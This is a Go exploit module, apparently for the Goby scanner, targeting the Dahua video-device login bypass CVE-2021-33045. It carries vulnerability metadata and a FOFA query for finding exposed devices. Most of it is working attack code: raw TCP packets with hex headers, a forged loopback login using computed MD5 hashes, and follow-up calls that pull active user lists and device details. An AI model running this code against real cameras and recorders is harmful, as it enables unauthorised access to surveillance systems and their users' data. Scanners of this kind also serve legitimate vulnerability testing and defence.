package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "DaHua Login Bypass (CVE-2021-33045)",
    "Description": "<p>NVR, XVR, VTO, and IPC are video products under the umbrella of Dahua.</p><p>The identity authentication bypass vulnerability found in some Dahua products during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.</p>",
    "Impact": "DaHua Login Bypass (CVE-2021-33045)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.dahuasecurity.com/support/cybersecurity/details/957\">https://www.dahuasecurity.com/support/cybersecurity/details/957</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "Dahua",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "大华视频部分产品存在登录绕过漏洞（CVE-2021-33045）",
            "Description": "<p>NVR, XVR, VTO, IPC等是大华旗下的视频系列产品。</p><p>大华视频部分产品存在登录身份认证绕过漏洞。攻击者可以通过构造恶意数据包来绕过设备身份验证，获取系统敏感配置和信息。</p>",
            "Impact": "<p>大华视频部分产品存在登录身份认证绕过漏洞。攻击者可以通过构造恶意数据包来绕过设备身份验证，获取系统敏感配置和信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.dahuasecurity.com/support/cybersecurity/details/957\">https://www.dahuasecurity.com/support/cybersecurity/details/957</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级Apache系统版本。</p>",
            "Product": "大华",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "DaHua Login Bypass (CVE-2021-33045)",
            "Description": "<p>NVR, XVR, VTO, and IPC are video products under the umbrella of Dahua.</p><p>The identity authentication bypass vulnerability found in some Dahua products during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.</p>",
            "Impact": "DaHua Login Bypass (CVE-2021-33045)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.dahuasecurity.com/support/cybersecurity/details/957\">https://www.dahuasecurity.com/support/cybersecurity/details/957</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Product": "Dahua",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "((body=\"id=\\\"search_card_label\\\" for=\\\"search_PlateEnable\\\">车牌号码</label>\" && body!=\"Server: couchdb\" )|| (protocol=\"rtsp\" && banner=\"Server: Dahua Rtsp\") || header=\"Server: DaHua DRS\" || banner=\"Server: DaHua DRS\" || header=\"Server: Dahua Rtsp Server\" || banner=\"Server: Dahua Rtsp Server\" || (header=\"ZheJiang Dahua Technology\" && header!=\"Content-Length: 59552\") || banner=\"ZheJiang Dahua Technology\" || banner=\"Basic realm=\\\"DahuaRtsp\" || (body=\"var g_isdeviceinited = true\" && body=\"widget/js/jquery.ui.widget.js\" && body=\"title::com_menu.title_setup\" && title!=\"WATASHI SERVICE\") || (body=\"css/playbackindex.css\" && body=\"class=\\\"J_content J_min_width\\\"\") || (body=\"J_sub_con J_loginbox\" && body=\"overflow:hidden;background-color\" && body=\"js/urlParser.js\") || (body=\"id=\\\"lab_loading\\\" class=\\\"J_load_p\" && body=\"src=\\\"/cap.js\\\"\" && body=\"'nav_margin').style.visibility = 'visible\" && title==\"WEB SERVICE\" && body!=\"/css/oem.css\" && body!=\"loginfoot\\\">WEB视频监控系统\" && body!=\"webApp.ability.getWebCap('showGb28181Client'\" && body!=\"class=\\\"ui-tip-container\\\" id=\\\"remark_modU\\\"\" && body!=\"class=\\\"login_inputbox ui-input fn-width163\\\"\") || body=\"tl(\\\"huazhonghua\\\")\" || (body=\"dhvideowhmode\" && body=\"platformHtm\" && body!=\"cpplus_bottom\" && body!=\"www.amcrest.com\" && body!=\"Amcrest\" && body!=\"interbras_font\" && body!=\"interbras_cloud\" && body!=\"interbrasCloud\") || (body=\"onkeypress=\\\"forbidBackSpace(event)\" && body=\"InsertNetRecordFileInfo\" && body=\"<div class=\\\"loginfoot\\\">WEB视频监控系统 - 2014</div>\") || (cert=\"Organization: DahuaTech\" && title=\"WEB SERVICE\") || (body=\"t_changepwdhint\" && body=\"ipsanuserManage_diaModUser_username_title\") || (body=\"var g_NaclWin\" && body=\"var g_isDeviceInited\" && body=\"if(g_ocx) g_ocx.SetTranslateString(jsonLang);\" && body!=\"class=\\\"oem-login-background\")) && cert!=\"Honeywell GPC Video\" && body!=\"<span>浩云安防</span></div>\"",
    "GobyQuery": "((body=\"id=\\\"search_card_label\\\" for=\\\"search_PlateEnable\\\">车牌号码</label>\" && body!=\"Server: couchdb\" )|| (protocol=\"rtsp\" && banner=\"Server: Dahua Rtsp\") || header=\"Server: DaHua DRS\" || banner=\"Server: DaHua DRS\" || header=\"Server: Dahua Rtsp Server\" || banner=\"Server: Dahua Rtsp Server\" || (header=\"ZheJiang Dahua Technology\" && header!=\"Content-Length: 59552\") || banner=\"ZheJiang Dahua Technology\" || banner=\"Basic realm=\\\"DahuaRtsp\" || (body=\"var g_isdeviceinited = true\" && body=\"widget/js/jquery.ui.widget.js\" && body=\"title::com_menu.title_setup\" && title!=\"WATASHI SERVICE\") || (body=\"css/playbackindex.css\" && body=\"class=\\\"J_content J_min_width\\\"\") || (body=\"J_sub_con J_loginbox\" && body=\"overflow:hidden;background-color\" && body=\"js/urlParser.js\") || (body=\"id=\\\"lab_loading\\\" class=\\\"J_load_p\" && body=\"src=\\\"/cap.js\\\"\" && body=\"'nav_margin').style.visibility = 'visible\" && title==\"WEB SERVICE\" && body!=\"/css/oem.css\" && body!=\"loginfoot\\\">WEB视频监控系统\" && body!=\"webApp.ability.getWebCap('showGb28181Client'\" && body!=\"class=\\\"ui-tip-container\\\" id=\\\"remark_modU\\\"\" && body!=\"class=\\\"login_inputbox ui-input fn-width163\\\"\") || body=\"tl(\\\"huazhonghua\\\")\" || (body=\"dhvideowhmode\" && body=\"platformHtm\" && body!=\"cpplus_bottom\" && body!=\"www.amcrest.com\" && body!=\"Amcrest\" && body!=\"interbras_font\" && body!=\"interbras_cloud\" && body!=\"interbrasCloud\") || (body=\"onkeypress=\\\"forbidBackSpace(event)\" && body=\"InsertNetRecordFileInfo\" && body=\"<div class=\\\"loginfoot\\\">WEB视频监控系统 - 2014</div>\") || (cert=\"Organization: DahuaTech\" && title=\"WEB SERVICE\") || (body=\"t_changepwdhint\" && body=\"ipsanuserManage_diaModUser_username_title\") || (body=\"var g_NaclWin\" && body=\"var g_isDeviceInited\" && body=\"if(g_ocx) g_ocx.SetTranslateString(jsonLang);\" && body!=\"class=\\\"oem-login-background\")) && cert!=\"Honeywell GPC Video\" && body!=\"<span>浩云安防</span></div>\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.dahuasecurity.com/",
    "DisclosureDate": "2021-10-06",
    "References": [
        "https://www.dahuasecurity.com/support/cybersecurity/details/957"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-33045"
    ],
    "CNVD": [
        "CNVD-2021-70815"
    ],
    "CNNVD": [
        "CNNVD-202109-1081"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "Dahua"
        ]
    },
    "PocId": "10231"
}`

	sendpayload := func(conn net.Conn, payload string) string {
		_, err := conn.Write([]byte(payload))
		if err != nil {
			return ""
		}
		resp := make([]byte, 4096)
		_, err = conn.Read(resp)
		if err != nil {
			return ""
		}
		return string(resp)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			conn, err := httpclient.GetTCPConn(u.HostInfo, time.Second*20)
			if err != nil {
				return false
			}
			defer conn.Close()
			payloadstart := "2000000044484950000000000000000091000000000000009100000000000000"
			payloadend := `{"method": "global.login", "params": {"userName": "admin", "password": "", "clientType": "Web3.0", "loginType": "Direct"}, "id": 0, "session": 0}`
			payloadstarthex, _ := hex.DecodeString(payloadstart)
			msg := fmt.Sprintf("%s%s", payloadstarthex, payloadend)
			resp := sendpayload(conn, msg)
			respHex := hex.EncodeToString([]byte(resp))
			respHexStart1 := respHex[0:24]
			respHexStart2 := "0100000009010000000000000901000000000000"
			respHexrandom := regexp.MustCompile("72616e646f6d223a22(.*?)222c").FindStringSubmatch(respHex)
			resprandom, _ := hex.DecodeString(respHexrandom[1])
			respHexrealm := regexp.MustCompile("227265616c6d223a22(.*?)227d2c").FindStringSubmatch(respHex)
			resprealm, _ := hex.DecodeString(respHexrealm[1])
			respHexsession := regexp.MustCompile("2273657373696f6e223a(.*?)7d").FindStringSubmatch(respHex)
			md51 := md5.Sum([]byte(fmt.Sprintf("admin:%s:admin", resprealm)))
			md51Upper := strings.ToUpper(fmt.Sprintf("%x", md51))
			md52 := md5.Sum([]byte(fmt.Sprintf("admin:%s:%s", resprandom, md51Upper)))
			md52Upper := strings.ToUpper(fmt.Sprintf("%x", md52))
			if strings.Contains(resp, "code") {
				payload2HexStart, _ := hex.DecodeString(respHexStart1 + respHexStart2)
				payload2Hexsession, _ := hex.DecodeString(respHexsession[1])
				msg2 := fmt.Sprintf(`%s{"method": "global.login", "params": {"userName": "admin", "ipAddr": "127.0.0.1", "loginType": "Loopback", "clientType": "Local", "authorityType": "Default", "passwordType": "Default", "password": "%s"}, "id": 1, "session": %s}`, payload2HexStart, md52Upper, payload2Hexsession)
				fmt.Println(msg2)
				resp2 := sendpayload(conn, msg2)
				if strings.Contains(resp2, `"result":true`) && strings.Contains(resp2, `"session`) {
					payload3HexStart2 := "0b0000004b000000000000004b00000000000000"
					payload3HexStart, _ := hex.DecodeString(respHexStart1 + payload3HexStart2)
					msg3 := fmt.Sprintf(`%s{"method": "global.logout", "params": null, "id": 2, "session": %s}`, payload3HexStart, payload2Hexsession)
					resp3 := sendpayload(conn, msg3)
					fmt.Println(resp3)
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			conn, err := httpclient.GetTCPConn(expResult.HostInfo.HostInfo, time.Second*20)
			if err != nil {
				expResult.Success = false
				return expResult
			}
			defer conn.Close()
			payloadstart := "2000000044484950000000000000000091000000000000009100000000000000"
			payloadend := `{"method": "global.login", "params": {"userName": "admin", "password": "", "clientType": "Web3.0", "loginType": "Direct"}, "id": 0, "session": 0}`
			payloadstarthex, _ := hex.DecodeString(payloadstart)
			msg := fmt.Sprintf("%s%s", payloadstarthex, payloadend)
			resp := sendpayload(conn, msg)
			respHex := hex.EncodeToString([]byte(resp))
			respHexStart1 := respHex[0:24]
			respHexStart2 := "0100000009010000000000000901000000000000"
			respHexrandom := regexp.MustCompile("72616e646f6d223a22(.*?)222c").FindStringSubmatch(respHex)
			resprandom, _ := hex.DecodeString(respHexrandom[1])
			respHexrealm := regexp.MustCompile("227265616c6d223a22(.*?)227d2c").FindStringSubmatch(respHex)
			resprealm, _ := hex.DecodeString(respHexrealm[1])
			respHexsession := regexp.MustCompile("2273657373696f6e223a(.*?)7d").FindStringSubmatch(respHex)
			md51 := md5.Sum([]byte(fmt.Sprintf("admin:%s:admin", resprealm)))
			md51Upper := strings.ToUpper(fmt.Sprintf("%x", md51))
			md52 := md5.Sum([]byte(fmt.Sprintf("admin:%s:%s", resprandom, md51Upper)))
			md52Upper := strings.ToUpper(fmt.Sprintf("%x", md52))
			if strings.Contains(resp, "code") {
				payload2HexStart, _ := hex.DecodeString(respHexStart1 + respHexStart2)
				payload2Hexsession, _ := hex.DecodeString(respHexsession[1])
				msg2 := fmt.Sprintf(`%s{"method": "global.login", "params": {"userName": "admin", "ipAddr": "127.0.0.1", "loginType": "Loopback", "clientType": "Local", "authorityType": "Default", "passwordType": "Default", "password": "%s"}, "id": 1, "session": %s}`, payload2HexStart, md52Upper, payload2Hexsession)
				fmt.Println(msg2)
				resp2 := sendpayload(conn, msg2)
				if strings.Contains(resp2, `"result":true`) {
					payload3HexStart, _ := hex.DecodeString(respHexStart1 + "020000005e000000000000005e00000000000000")
					msg3 := fmt.Sprintf(`%s{"method": "userManager.getActiveUserInfoAll", "params": null, "id": 2, "session": %s}`, payload3HexStart, payload2Hexsession)
					fmt.Println(msg3)
					resp3 := sendpayload(conn, msg3)
					resp3regex := regexp.MustCompile("\"users\":(.*?)},\"result\"").FindStringSubmatch(resp3)
					payload4HexStart, _ := hex.DecodeString(respHexStart1 + "060000004c010000000000004c01000000000000")
					msg4 := fmt.Sprintf(`%s{"method": "system.multicall", "params": [{"method": "magicBox.getDeviceType", "params": null, "id": 3, "session": %s}, {"method": "magicBox.getDeviceClass", "params": null, "id": 4, "session": %s}, {"method": "global.getCurrentTime", "params": null, "id": 5, "session": %s}], "id": 6, "session": %s}`, payload4HexStart, payload2Hexsession, payload2Hexsession, payload2Hexsession, payload2Hexsession)
					fmt.Println(msg4)
					fmt.Println("111111111111")
					resp4 := sendpayload(conn, msg4)
					fmt.Println(resp4)
					fmt.Println("111111111111")
					resp4regex := regexp.MustCompile("\"params\":{\"type\":(.*?)},\"result\"").FindStringSubmatch(resp4)
					if strings.Contains(resp4, "id") {
						payload10HexStart, _ := hex.DecodeString(respHexStart1 + "0b0000004b000000000000004b00000000000000")
						msg10 := fmt.Sprintf(`%s{"method": "global.logout", "params": null, "id": 7, "session": %s}`, payload10HexStart, payload2Hexsession)
						resp10 := sendpayload(conn, msg10)
						fmt.Println(resp10)
						expResult.Output = "DeviceType: " + resp4regex[1] + "\n\nActiveUser: " + resp3regex[1]
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
